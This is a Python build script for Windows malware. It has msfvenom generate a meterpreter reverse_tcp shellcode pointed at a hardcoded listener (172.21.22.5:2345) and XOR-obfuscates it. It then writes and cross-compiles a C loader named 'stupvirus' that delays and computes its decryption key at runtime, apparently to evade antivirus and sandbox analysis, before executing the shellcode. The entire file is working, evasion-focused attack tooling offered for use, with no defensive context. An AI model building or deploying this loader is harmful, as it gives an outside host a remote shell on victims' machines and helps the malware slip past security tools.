#! /usr/bin/env python
import subprocess
import random
import os

lhost = "172.21.22.5"
lport = "2345"

def cmdline(command):
    process = subprocess.Popen(
        args=command,
        stdout=subprocess.PIPE,
        shell=True
    )
    return process.communicate()[0]

if __name__=="__main__":
    # Generate payload
    cmd = "msfvenom -a x64 --platform windows -f py "
    cmd += "-p windows/x64/meterpreter/reverse_tcp LHOST="
    cmd += lhost + " LPORT=" + lport
    payload_code = cmdline(cmd)
    exec(payload_code)

    # XOR the payload
    r1 = random.randint(17, 59)
    r2 = random.randint(2, 13)
    xorkey = ((4*r1 + 18*r2 + 3) % 125) + 1
    xored = []
    xoredlen = len(buf)
    for i in range(xoredlen):
        if (i % 2 == 0):
            xored.append(chr(ord(buf[i]) ^ xorkey))
        else:
            xored.append(chr(ord(buf[i]) ^ (xorkey + 128)))
    to_hex = "".join(["\\x%02x"%ord(x) for x in xored])

    # Create .c
    file_c = open('stupvirus.c', 'w')

    file_c.write("#include <windows.h>\n")
    file_c.write("#include <stdio.h>\n")
    file_c.write("#include <stdlib.h>\n")
    file_c.write("#include <time.h>\n")
    file_c.write("int buflen = %s;\n"%xoredlen)
    file_c.write("unsigned char buf[] = \"%s\";\n"%to_hex)
    file_c.write("void xor_buf(unsigned char buf[], int buflen, unsigned char shift) {\n")
    file_c.write("for (size_t i = 0; i < buflen; i++) {\n")
    file_c.write("if (i % 2 == 0) {\n")
    file_c.write("buf[i] = buf[i] ^ shift;\n")
    file_c.write("} else {\n")
    file_c.write("buf[i] = buf[i] ^ (shift + 128);\n")
    file_c.write("}}}\n")
    file_c.write("int check_time(void) {\n")
    file_c.write("time_t t1 = time(NULL);\n")
    file_c.write("Sleep(3000);\n")
    file_c.write("time_t t2 = time(NULL);\n")
    file_c.write("return t2 - t1; // 3\n")
    file_c.write("}\n")
    file_c.write("int get_fibo(void) {\n")
    file_c.write("int i;long a = 15432351;\n")
    file_c.write("for (i = 0; i < 1002560; i++) {\n")
    file_c.write("if (a % 2 == 0) {\n")
    file_c.write("a = a / 2;\n")
    file_c.write("} else {\n")
    file_c.write("a = 3*a + 1;\n")
    file_c.write("}}\n")
    file_c.write("return a; // 4\n")
    file_c.write("}\n")
    file_c.write("int get_prime(void) {\n")
    file_c.write("int i; int j; int c = 0;\n")
    file_c.write("for (i = 2; i < 32000; i++) {\n")
    file_c.write("for (j = 2; j <= i; j++) {\n")
    file_c.write("if (i % j == 0 && i == j) {\n")
    file_c.write("c = (c + i) % 89;\n")
    file_c.write("}}} return c; //18\n")
    file_c.write("}\n")
    file_c.write("int main(void) {\n")
    file_c.write("int *a = malloc(sizeof(int));*a = 42;\n")
    file_c.write("DWORD ignore;\n")
    file_c.write("int (*func)();\n")
    file_c.write("xor_buf(buf, buflen, (unsigned char) (("+str(r1)+"*get_fibo()+"+str(r2)+"*get_prime() + check_time()) % 125) + 1);\n")
    file_c.write("VirtualProtect(buf, buflen, PAGE_EXECUTE, &ignore);\n")
    file_c.write("func = (int (*)()) buf;\n")
    file_c.write("(int)(*func)();\n")
    file_c.write("return 0;\n")
    file_c.write("}\n")

    file_c.close()

    # Compile
    os.system("x86_64-w64-mingw32-gcc -mwindows -Wall stupvirus.c -o stupvirus.exe")

    # Strip
    os.system("strip --strip-unneeded -X stupvirus.exe")
